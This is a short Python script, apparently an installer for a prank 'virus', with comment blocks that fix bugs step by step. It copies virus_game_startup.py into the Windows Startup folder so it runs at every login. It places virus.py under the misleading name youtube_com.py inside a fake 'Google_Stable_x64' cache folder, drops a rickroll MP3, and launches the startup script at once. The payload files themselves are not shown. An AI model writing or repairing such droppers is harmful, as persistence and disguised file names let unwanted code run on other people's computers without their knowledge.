import os, sys
PYTHON_COMMAND = sys.executable

print("Starting installer...")

home_dir = os.path.expanduser("~")
# The home_dir on Windows is typically C:\Users\YourName
# The screenshot shows 'C:\Users\justlinux'
print("Home dir is: ", home_dir)

# --- Fix 1: Correctly build the startup folder path ---
# os.path.join handles separators correctly.
startup_folder = os.path.join(
    home_dir,
    "AppData",
    "Roaming",
    "Microsoft",
    "Windows",
    "Start Menu",
    "Programs",
    "Startup"
)

print("Copying files...")

# --- Fix 2: Correctly build the target directory path and use 'os.makedirs' (better than os.system('mkdir')) ---
# The original was trying to mix home_dir and a relative path, which doesn't work well with os.system.
# Use os.makedirs with 'exist_ok=True' to avoid errors if the folder already exists.
target_cache_dir = os.path.join(
    home_dir,
    "Downloads",
    "Google_Stable_x64",
    "assets",
    "cache"
)
os.makedirs(target_cache_dir, exist_ok=True)
# The old os.system(f"mkdir {os.path.join("home_dir/Downloads/...")}") was causing "The syntax of the command is incorrect."

# --- Fix 3: Correctly build the full paths for the 'copy' command ---
# It's safer to use full paths and os.path.join() for robust file operations.
# The original code's startup_folder was missing the Drive/Users/ part when combined with os.path.expanduser("~").
# The original f'{startup_folder}/virus_game_startup.py' was using forward slashes inside an f-string which is risky on Windows.
os.system(f"copy src\\virus_game_startup.py {os.path.join(startup_folder, 'virus_game_startup.py')}")
os.system(f"copy youtube_com-watch-dQw4w9WgXcQ.mp3 %USERPROFILE%\\Music\\youtube_com-watch-dQw4w9WgXcQ.mp3")
os.system(f"copy youtube_com-watch-dQw4w9WgXcQ.mp3 {os.path.join(target_cache_dir, 'youtube_com-watch-dQw4w9WgXcQ.mp3')}")
os.system(f"copy virus.py {os.path.join(target_cache_dir, 'youtube_com.py')}")

print("Running virus_game_startup.py...")
# --- Fix 4: Correctly build the path to run the file ---
# The path must be fully correct, which the new 'startup_folder' ensures.
os.system(f"{PYTHON_COMMAND} {os.path.join(startup_folder, 'virus_game_startup.py')}")